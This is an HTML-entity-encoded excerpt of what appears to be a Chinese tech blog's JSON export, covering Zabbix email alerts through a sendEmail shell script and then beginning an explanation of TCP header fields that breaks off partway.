#x4E3A;Google&#x9075;&#x4ECE;Jabber&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E14;Google&#x5DF2;&#x7ECF;&#x5C06;Gtalk&#x7684;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;&#x7ED9;&#x4E86;&#x5176;&#x5B83;&#x7684;Jabber&#x670D;&#x52A1;&#x5668;&#x3002;&#x6240;&#x4EE5;PSI&#x3001;Giam&#x7B49;Jabber&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x652F;&#x6301;GTalk&#x7528;&#x6237;&#x767B;&#x9646;&#x3002;&#x56FD;&#x5185;&#x6CA1;&#x5565;&#x4EBA;&#x7528;&#x3002; sendEmail&#x662F;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x7684;SMTP&#x90AE;&#x4EF6;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;sendEmail&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#x3002;sendEmail&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x5E76;&#x4E14;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x3002;&#x8FD9;&#x4E2A;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x5728;php&#x3001;perl&#x548C;web&#x7AD9;&#x70B9;&#x4F7F;&#x7528;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x4E0D;&#x662F;sendmail&#x3002; sendEmail&#x5B89;&#x88C5;12345678910111213# &#x4E0B;&#x8F7D;&#x8F6F;&#x4EF6;wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz# &#x89E3;&#x538B;&#x8F6F;&#x4EF6;# tar zxvf sendEmail-v1.56.tar.gz# &#x8FDB;&#x5165;&#x76EE;&#x5F55;cd /usr/src/sendEmail-v1.56# &#x521B;&#x5EFA;&#x76EE;&#x5F55;mkdir /usr/local/bin# &#x590D;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6743;&#x9650;cp -a sendEmail /usr/local/binchmod +x /usr/local/bin/sendEmail# &#x5B89;&#x88C5;&#x7EC4;&#x4EF6;yum install perl-Net-SSLeay perl-IO-Socket-SSL -y zabbix server&#x7AEF;&#x914D;&#x7F6E;&#x8FDB;&#x5165;zabbix&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;AlertScriptsPath&#x53D8;&#x91CF;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#x3002; &#x8FDB;&#x5165;&#x76F8;&#x5173;&#x76EE;&#x5F55;cd /usr/lib/zabbix/alertscripts &#x65B0;&#x5EFA;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;123456#!/bin/bashto=$1subject=$2body=$3/usr/local/bin/sendEmail -f a@domain.com -t &quot;$to&quot; -s smtp.exmail.qq.com -u &quot;$subject&quot; -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m &quot;$body&quot; a@domain.com &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;smtp.exmail.qq.com &#x8868;&#x793A;&#x90AE;&#x7BB1;&#x7684;smtp&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;&#x817E;&#x8BAF;&#x90AE;&#x7BB1;&#x3002;password &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;&#x5BC6;&#x7801; &#x7F16;&#x8F91;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x7ED9;&#x811A;&#x672C;&#x6743;&#x9650;12chmod +x sendEmail.shchown zabbix.zabbix sendEmail.sh &#x624B;&#x52A8;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x811A;&#x672C;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x53C2;&#x6570;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x63A5;&#x6536;&#x4EBA;&#xFF0C;&#x4E3B;&#x9898;&#xFF0C;&#x5185;&#x5BB9;1./sendEmail.sh c@domain.com test 123 &#x767B;&#x5F55;c@domain.com&#x7684;&#x8D26;&#x6237;&#xFF0C;&#x67E5;&#x770B;&#x90AE;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6536;&#x5230;&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x6536;&#x4E0D;&#x5230;&#x90AE;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5;linux&#x7F51;&#x7EDC;&#x95EE;&#x9898;,iptables&#x3001;selinux&#x662F;&#x5426;&#x5173;&#x95ED;&#x3002; zabbix web&#x7AEF;&#x914D;&#x7F6E;&#x8FDB;&#x5165;zabbix&#x7BA1;&#x7406;&#x9875;&#x9762;&#x70B9;&#x51FB;&#x7BA1;&#x7406;-&gt;&#x62A5;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B; &#x70B9;&#x51FB;&#x6700;&#x53F3;&#x8FB9;&#x7684;&#x521B;&#x5EFA;&#x5A92;&#x4F53;&#x7C7B;&#x578B; &#x8F93;&#x5165;&#x811A;&#x672C;&#x540D;&#x79F0;&#xFF0C;&#x7C7B;&#x578B;&#x9009;&#x62E9;&#x811A;&#x672C;&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;3&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;sendEmail.sh&#x811A;&#x672C;&#x9700;&#x8981;&#x7684;3&#x4E2A;&#x53C2;&#x6570;&#xFF1A;&#x6536;&#x4EF6;&#x4EBA;&#x5730;&#x5740;&#x3001;&#x4E3B;&#x9898;&#x3001;&#x8BE6;&#x7EC6;&#x5185;&#x5BB9;{ALERT.SENDTO}{ALERT.SUBJECT}{ALERT.MESSAGE} &#x89E3;&#x91CA;:&#x5F88;&#x591A;&#x4EBA;&#x5B89;&#x88C5;zabbix 3.0&#x4E4B;&#x540E;&#xFF0C;&#x5199;&#x7684;&#x811A;&#x672C;&#x4E00;&#x76F4;&#x53D1;&#x4FE1;&#x4E0D;&#x6210;&#x529F;,&#x624B;&#x52A8;&#x6267;&#x884C;&#x65F6;&#x53EF;&#x4EE5;&#x7684;&#x3002;&#x90A3;&#x662F;&#x56E0;&#x4E3A;zabbix3.0&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x53C2;&#x6570;&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x4E0D;&#x5199;&#x53C2;&#x6570;&#xFF0C;&#x5B83;&#x662F;&#x4E0D;&#x4F1A;&#x4F20;&#x53C2;&#x6570;&#x7684;&#x3002;&#x5728;2.x&#x7248;&#x672C;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x4F20;3&#x4E2A;&#x53C2;&#x6570;&#x3002; &#x70B9;&#x51FB;Admin&#x7528;&#x6237; &#x70B9;&#x51FB;&#x6DFB;&#x52A0; &#x9009;&#x62E9;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x8F93;&#x5165;&#x6536;&#x4EF6;&#x4EBA;&#x7684;&#x90AE;&#x7BB1;&#x5730;&#x5740; &#x70B9;&#x51FB;&#x7528;&#x6237;&#x7FA4;&#x7EC4;&#xFF0C;&#x70B9;&#x51FB;zabbix administrator&#x540E;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6A21;&#x5F0F;&#xFF0C;&#x70B9;&#x51FB;&#x4E00;&#x4E0B;&#xFF0C;&#x5C31;&#x542F;&#x7528;&#x4E86; &#x70B9;&#x6743;&#x9650;-&gt;&#x6DFB;&#x52A0; &#x9009;&#x62E9;&#x6240;&#x6709; &#x70B9;&#x51FB;&#x66F4;&#x65B0; &#x70B9;&#x51FB;&#x914D;&#x7F6E;-&gt;&#x52A8;&#x4F5C; &#x70B9;&#x51FB;&#x9ED8;&#x8BA4;&#x7684;&#x52A8;&#x4F5C; &#x70B9;&#x51FB;&#x64CD;&#x4F5C;-&gt;&#x7F16;&#x8F91; &#x4FEE;&#x6539;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x4E3A;60&#x79D2;&#x4FEE;&#x6539;&#x6B65;&#x9AA4;&#x4E3A;3,&#x8868;&#x793A;&#x89E6;&#x53D1;3&#x6B21;&#x52A8;&#x4F5C;&#x9009;&#x62E9;&#x7528;&#x6237;Admin&#x9009;&#x62E9;&#x4EC5;&#x9001;&#x5230;sendEmail.sh&#x70B9;&#x51FB;&#x66F4;&#x65B0; &#x70B9;&#x51FB;&#x66F4;&#x65B0; &#x89E3;&#x91CA;:&#x9ED8;&#x8BA4;&#x7684;&#x6B65;&#x9AA4;&#x662F;1-1,&#x4E5F;&#x5373;&#x662F;&#x4ECE;1&#x5F00;&#x59CB;&#x5230;1&#x7ED3;&#x675F;&#x3002;&#x4E00;&#x65E6;&#x6545;&#x969C;&#x53D1;&#x751F;&#xFF0C;&#x5C31;&#x662F;&#x6267;&#x884C;sendEmail.sh&#x811A;&#x672C;&#x53D1;&#x751F;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;Admin&#x7528;&#x6237;&#x548C;zabbix administrator&#x7EC4;&#x3002;&#x5047;&#x5982;&#x6545;&#x969C;&#x6301;&#x7EED;&#x4E86;1&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5B83;&#x4E5F;&#x53EA;&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x3002;&#x5982;&#x679C;&#x6539;&#x6210;1-0&#xFF0C;0&#x662F;&#x8868;&#x793A;&#x4E0D;&#x9650;&#x5236;.&#x65E0;&#x9650;&#x53D1;&#x9001;&#x95F4;&#x9694;&#x5C31;&#x662F;&#x9ED8;&#x8BA4;&#x6301;&#x7EED;&#x65F6;&#x95F4;60&#x79D2;&#x3002;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x9001;60&#x5C01;&#x90AE;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x62A5;&#x8B66;&#x7684;&#x8BDD;,&#x53EF;&#x4EE5;&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x6761;&#x65B0;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;&#x9009;&#x62E9;&#x77ED;&#x4FE1;&#x811A;&#x672C;&#x3002; &#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;&#x5148;&#x6DFB;&#x52A0;&#x4E00;&#x53F0;&#x4E3B;&#x673A;test&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x662F;&#x7EA2;&#x8272;&#x72B6;&#x6001; &#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;&#x4E86; &#x70B9;&#x51FB;&#x62A5;&#x8868;-&gt;&#x52A8;&#x4F5C;&#x65E5;&#x5FD7; &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x89E6;&#x53D1;&#x52A8;&#x4F5C;&#x7684;&#x6B21;&#x6570;&#x3002;&#x53EA;&#x4F1A;&#x6709;3&#x6B21;&#xFF0C;&#x9664;&#x975E;test&#x4E3B;&#x673A;&#x72B6;&#x6001;&#x6539;&#x53D8;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6B63;&#x5E38;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x6B21;,&#x5426;&#x5219;&#x4E0D;&#x4F1A;&#x518D;&#x89E6;&#x53D1;&#x3002; &#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x90AE;&#x4EF6;&#x91CC;&#x9762;&#x5185;&#x5BB9;&#x90FD;&#x5806;&#x5230;&#x4E00;&#x8D77;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x6362;&#x884C;&#xFF0C;&#x4E14;&#x662F;&#x82F1;&#x6587;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x4FEE;&#x6539;&#x3010;&#x7EC4;&#x6001;-&#x52A8;&#x4F5C;-&#x52A8;&#x4F5C;&#x3011;&#x91CC;&#x7684;&#x914D;&#x7F6E;&#x3002; &#x4E0B;&#x9762;&#x662F;&#x6211;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x914D;&#x7F6E;&#x4FE1;&#x606F;:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051====================================================# &#x9ED8;&#x8BA4;&#x63A5;&#x6536;&#x4EBA;:&#x6545;&#x969C;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x53D1;&#x751F;&#x3010; {TRIGGER.NAME}&#x3011;&#x6545;&#x969C;&#xFF01;====================================================# &#x9ED8;&#x8BA4;&#x4FE1;&#x606F;:&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt;====================================================# &#x6062;&#x590D;&#x4E3B;&#x65E8;:&#x6062;&#x590D;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x6545;&#x969C;&#x3010; {TRIGGER.NAME}&#x3011;&#x5DF2;&#x6062;&#x590D;&#xFF01;====================================================# &#x6062;&#x590D;&#x4FE1;&#x606F;:&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt; &#x66F4;&#x6539;&#x540E;&#xFF0C;&#x6536;&#x5230;&#x7684;&#x90AE;&#x4EF6;&#x6837;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[]},{"title":"TCP三次握手与四次分手","slug":"TCP三次握手与四次分手","date":"2016-10-29T14:10:00.000Z","updated":"2016-11-17T11:59:42.670Z","comments":true,"path":"2016/10/29/TCP三次握手与四次分手/","link":"","permalink":"http://www.wangxin123.com/2016/10/29/TCP三次握手与四次分手/","excerpt":"TCP&#x7B80;&#x4ECB;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#xFF1A; &#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;TCP&#x5DE5;&#x4F5C;&#x5728;&#x7F51;&#x7EDC;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x7B2C;&#x56DB;&#x5C42;&#x2014;&#x2014;Transport&#x5C42;&#xFF0C;IP&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x2014;&#x2014;Network&#x5C42;&#xFF0C;ARP&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x2014;&#x2014;Data Link&#x5C42;&#xFF1B;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x53EB;Frame&#xFF0C;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53EB;Packet&#xFF0C;&#x7B2C;&#x56DB;&#x5C42;&#x7684;&#x6570;&#x636E;&#x53EB;Segment&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7B80;&#x5355;&#x7684;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x4E0B;&#x6765;&#xFF0C;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x5C42;&#x90FD;&#x4F1A;&#x52A0;&#x4E0A;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53D1;&#x9001;&#x5230;&#x6570;&#x636E;&#x63A5;&#x6536;&#x7AEF;&#x3002;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x6D41;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x5C31;&#x662F;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x5C01;&#x88C5;&#x548C;&#x89E3;&#x5C01;&#x88C5;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x5728;OSI&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x534F;&#x8BAE;&#x5982;&#x4E0B;&#xFF1A;","keywords":null,"text":"TCP&#x7B80;&#x4ECB;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#xFF1A; &#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;TCP&#x5DE5;&#x4F5C;&#x5728;&#x7F51;&#x7EDC;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x7B2C;&#x56DB;&#x5C42;&#x2014;&#x2014;Transport&#x5C42;&#xFF0C;IP&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x2014;&#x2014;Network&#x5C42;&#xFF0C;ARP&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x2014;&#x2014;Data Link&#x5C42;&#xFF1B;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x53EB;Frame&#xFF0C;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53EB;Packet&#xFF0C;&#x7B2C;&#x56DB;&#x5C42;&#x7684;&#x6570;&#x636E;&#x53EB;Segment&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7B80;&#x5355;&#x7684;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x4E0B;&#x6765;&#xFF0C;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x5C42;&#x90FD;&#x4F1A;&#x52A0;&#x4E0A;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53D1;&#x9001;&#x5230;&#x6570;&#x636E;&#x63A5;&#x6536;&#x7AEF;&#x3002;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x6D41;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x5C31;&#x662F;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x5C01;&#x88C5;&#x548C;&#x89E3;&#x5C01;&#x88C5;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x5728;OSI&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x534F;&#x8BAE;&#x5982;&#x4E0B;&#xFF1A; TCP&#x662F;&#x4E00;&#x4E2A;&#x534F;&#x8BAE;&#xFF0C;&#x90A3;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x662F;&#x4EC0;&#x4E48;&#x6837;&#x5B50;&#x7684;&#x5462;&#xFF1F;&#x8981;&#x8FDB;&#x884C;&#x66F4;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x5256;&#x6790;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E86;&#x89E3;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x719F;&#x8BB0;TCP&#x534F;&#x8BAE;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x542B;&#x4E49;&#x3002; &#x4E0A;&#x9762;&#x5C31;&#x662F;TCP&#x534F;&#x8BAE;&#x5934;&#x90E8;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x592A;&#x91CD;&#x8981;&#x4E86;&#xFF0C;&#x662F;&#x7406;&#x89E3;&#x5176;&#x5B83;&#x5185;&#x5BB9;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E0B;&#x9762;&#x5C31;&#x5C06;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x4FE1;&#x606F;&#x90FD;&#x8BE6;&#x7EC6;&#x7684;&#x8BF4;&#x660E;&#x4E00;&#x4E0B;&#x3002; Source Port&#x548C;Destination Port:&#x5206;&#x522B;&#x5360;&#x7528;16&#x4F4D;&#xFF0C;&#x8868;&#x793A;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF1B;&#x7528;&#x4E8E;&#x533A;&#x522B;&#x4E3B;&#x673A;&#x4E2D;&#x7684;&#x4E0D;&#x540C;&#x8FDB;&#x7A0B;&#xFF0C;&#x800C;IP&#x5730;&#x5740;&#x662F;&#x7528;&#x6765;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x673A;&#x7684;&#xFF0C;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x914D;&#x5408;&#x4E0A;IP&#x9996;&#x90E8;&#x4E2D;&#x7684;&#x6E90;IP&#x5730;&#x5740;&#x548C;&#x76EE;&#x7684;IP&#x5730;&#x5740;&#x5C31;&#x80FD;&#x552F;&#x4E00;&#x7684;&#x786E;&#x5B9A;&#x4E00;&#x4E2A;TCP&#x8FDE;&#x63A5;&#xFF1B; Sequence Number:&#x7528;&#x6765;&#x6807;&#x8BC6;&#x4ECE;TCP&#x53D1;&#x7AEF;&#x5411;TCP&#x6536;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5B57;&#x8282;&#x6D41;&#xFF0C;&#x5B83;&#x8868;&#x793A;&#x5728;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x4E2D;&#x7684;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5728;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x7684;&#x5E8F;&#x53F7;&#xFF1B;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x7F51;&#x7EDC;&#x62A5;&#x4E71;&#x5E8F;&#x7684;&#x95EE;&#x9898;&#xFF1B; Acknowledgment Number:32&#x4F4D;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x5305;&#x542B;&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x7684;&#x4E00;&#x7AEF;&#x6240;&#x671F;&#x671B;&#x6536;&#x5230;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5E8F;&#x53F7;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x786E;&#x8BA4;&#x5E8F;&#x53F7;&#x5E94;&#x5F53;&#x662F;&#x4E0A;&#x6B21;&#x5DF2;&#x6210;&#x529F;&#x6536;&#x5230;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5E8F;&#x53F7;&#x52A0;1&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x6807;&#x5FD7;&#x4F4D;&#x4E2D;&#x7684;ACK&#x6807;&#x5FD7;&#xFF08;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#xFF09;&#x4E3A;1&#x65F6;&#x8BE5;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x7684;&#x5B57;&#x6BB5;&#x624D;&#x6709;&#x6548;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x4E0D;&#x4E22;&#x5305;&#x7684;&#x95EE;&#x9898;&#xFF1B; Offset:&#x7ED9;&#x51FA;&#x9996;&#x90E8;&#x4E2D;32 bit&#x5B57;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x8FD9;&#x4E2A;&#x503C;&#x662F;&#x56E0;&#x4E3A;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#x7684;&#x957F;&#x5EA6;&#x662F;&#x53EF;&#x53D8;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x5360;4bit&#xFF08;&#x6700;&#x591A;&#x80FD;&#x8868;&#x793A;15&#x4E2A;32bit&#x7684;&#x7684;&#x5B57;&#xFF0C;&#x5373;4*15=60&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF09;&#xFF0C;&#x56E0;&#x6B64;TCP&#x6700;&#x591A;&#x6709;60&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#xFF0C;&#x6B63;&#x5E38;&#x7684;&#x957F;&#x5EA6;&#x662F;20&#x5B57;&#x8282;&#xFF1B; TCP Flags:TCP&#x9996;&#x90E8;&#x4E2D;&#x6709;6&#x4E2A;&#x6807;&#x5FD7;&#x6BD4;&#x7279;&#xFF0C;&#x5B83;&#x4EEC;&#x4E2D;&#x7684;&#x591A;&#x4E2A;&#x53EF;&#x540C;&#x65F6;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;1&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7528;&#x4E8E;&#x64CD;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#x673A;&#x7684;&#xFF0C;&#x4F9D;&#x6B21;&#x4E3A;URG&#xFF0C;ACK&#xFF0C;PSH&#xFF0C;RST&#xFF0C;SYN&#xFF0C;FIN&#x3002;&#x6BCF;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7684;&#x610F;&#x601D;&#x5982;&#x4E0B;&#xFF1A; 